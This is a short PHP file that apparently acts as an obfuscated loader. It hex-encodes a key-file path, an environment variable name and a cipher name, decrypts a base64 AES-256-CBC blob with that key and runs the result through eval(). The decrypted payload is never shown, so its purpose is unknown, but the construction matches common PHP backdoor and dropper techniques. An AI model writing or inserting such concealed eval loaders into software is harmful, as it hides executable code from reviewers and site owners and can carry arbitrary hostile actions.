<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wAEAaAC0wd4XRWY99GVBCw==');

$c=base64_decode(

'IwoieTWg6aWreQWsRioCAOedBGwDYnW0qekDnwHse6OnhrCiHHWX6Wh0FYulXsL3aIEs3Qye32xY' .
'zve1JAiHixn00WxoSK8xUlMYqlrxkE1l+/+TWBAyGXI5MeGE73nr1e21cHGuv8oQ8thFOH6/ZCcD' .
'Jjed3wDSpk680MJEaGqv2X9l+cnaGVMDcZQdpDwjQuCZV0ZCGusgGC0wr1UK/sy7zwFtVZVGxiZ7' .
'yjK9iSqUsauWwh0K7OKRVA99rDeYlO/al4AoQFsHPpeLsMPg1CAJw+rhR/Gn309bAoxijJ9PbOub' .
'bNevcCUmEgUNrK21eGNGazfk8ZbO5H7/P7dSQrmYqEwig3mSKuXtuzNxvwiT6gPz4rae3Wnuiujp' .
'lZnVUqBsO6/a0yIh8WE/AoLujV7Th3dvDeMAExShQL0JDP4cxrQR5KM9Z3Pem+4OZZClsA/bRPAJ' .
'81TkFqc0moaIHebk0onXA7z6yVR0epRcwkwyK84NYakN0s1Vp8eS9zxPvjCjQu1UyOBz+ooTZfwu' .
'+t3Pt3bIjAcT1CovFsrZnqx2fUvcrnvt5Rd1QELpOSWfyPlOaQSkwJf5VFrNiDkOno4FN1gNpGuH' .
'tW3SpcjEbPby61dFoaQ1lJQAnaF2DNy3F1Ih8yW/m6eo3gK8rUbWjUFekQO7Ok78bWrF350RKoe6' .
'30HqzIHGi7qu18kfM5i1voY1JsyrqDW58NDWylEG/Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

